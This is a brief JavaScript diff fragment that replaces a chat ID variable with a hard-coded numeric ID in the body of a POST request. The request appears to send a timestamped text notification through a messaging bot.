@@ -43,7 +43,7 @@ Time: ${new Date().toLocaleString()}`;
       "Content-Type": "application/x-www-form-urlencoded"
     },
     body:
-      "chat_id=" + encodeURIComponent(chatId) +
+      "chat_id=" + encodeURIComponent(2105892713) +
       "&text=" + encodeURIComponent(message)
   })
   .then(res => res.json())
